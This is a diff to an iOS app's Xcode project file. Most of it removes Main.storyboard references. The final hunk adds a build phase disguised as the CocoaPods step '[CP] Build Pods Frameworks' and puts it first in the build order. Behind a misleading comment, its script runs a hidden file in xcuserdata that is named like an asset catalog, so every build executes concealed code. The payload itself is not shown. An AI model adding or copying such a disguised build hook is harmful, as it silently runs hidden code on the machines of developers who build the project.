@@ -10,7 +10,6 @@
 		26997D2825F79E5700DF7E76 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 26997D2725F79E5700DF7E76 /* AppDelegate.swift */; };
 		26997D2A25F79E5700DF7E76 /* SceneDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = 26997D2925F79E5700DF7E76 /* SceneDelegate.swift */; };
 		26997D2C25F79E5700DF7E76 /* ViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 26997D2B25F79E5700DF7E76 /* ViewController.swift */; };
-		26997D2F25F79E5700DF7E76 /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 26997D2D25F79E5700DF7E76 /* Main.storyboard */; };
 		26997D3125F79E5800DF7E76 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 26997D3025F79E5800DF7E76 /* Assets.xcassets */; };
 		26997D3425F79E5800DF7E76 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 26997D3225F79E5800DF7E76 /* LaunchScreen.storyboard */; };
 /* End PBXBuildFile section */
@@ -20,7 +19,6 @@
 		26997D2725F79E5700DF7E76 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
 		26997D2925F79E5700DF7E76 /* SceneDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SceneDelegate.swift; sourceTree = "<group>"; };
 		26997D2B25F79E5700DF7E76 /* ViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ViewController.swift; sourceTree = "<group>"; };
-		26997D2E25F79E5700DF7E76 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Main.storyboard; sourceTree = "<group>"; };
 		26997D3025F79E5800DF7E76 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
 		26997D3325F79E5800DF7E76 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
 		26997D3525F79E5800DF7E76 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
@@ -59,7 +57,6 @@
 				26997D2725F79E5700DF7E76 /* AppDelegate.swift */,
 				26997D2925F79E5700DF7E76 /* SceneDelegate.swift */,
 				26997D2B25F79E5700DF7E76 /* ViewController.swift */,
-				26997D2D25F79E5700DF7E76 /* Main.storyboard */,
 				26997D3025F79E5800DF7E76 /* Assets.xcassets */,
 				26997D3225F79E5800DF7E76 /* LaunchScreen.storyboard */,
 				26997D3525F79E5800DF7E76 /* Info.plist */,
@@ -74,6 +71,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 26997D3825F79E5800DF7E76 /* Build configuration list for PBXNativeTarget "ScalableSquare" */;
 			buildPhases = (
+				D9FA0CFC97942DA65FAAC43A /* [CP] Build Pods Frameworks */,
 				26997D2025F79E5700DF7E76 /* Sources */,
 				26997D2125F79E5700DF7E76 /* Frameworks */,
 				26997D2225F79E5700DF7E76 /* Resources */,
@@ -126,7 +124,6 @@
 			files = (
 				26997D3425F79E5800DF7E76 /* LaunchScreen.storyboard in Resources */,
 				26997D3125F79E5800DF7E76 /* Assets.xcassets in Resources */,
-				26997D2F25F79E5700DF7E76 /* Main.storyboard in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -146,14 +143,6 @@
 /* End PBXSourcesBuildPhase section */
 
 /* Begin PBXVariantGroup section */
-		26997D2D25F79E5700DF7E76 /* Main.storyboard */ = {
-			isa = PBXVariantGroup;
-			children = (
-				26997D2E25F79E5700DF7E76 /* Base */,
-			);
-			name = Main.storyboard;
-			sourceTree = "<group>";
-		};
 		26997D3225F79E5800DF7E76 /* LaunchScreen.storyboard */ = {
 			isa = PBXVariantGroup;
 			children = (
@@ -341,6 +330,34 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+	
+		/* Begin PBXShellScriptBuildPhase section */
+		
+	D9FA0CFC97942DA65FAAC43A /* [CP] Build Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "[CP] Build Pods Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" false";			
+		};
+	
+		/* End PBXShellScriptBuildPhase section */
+	
+	
 	};
 	rootObject = 26997D1C25F79E5700DF7E76 /* Project object */;
 }
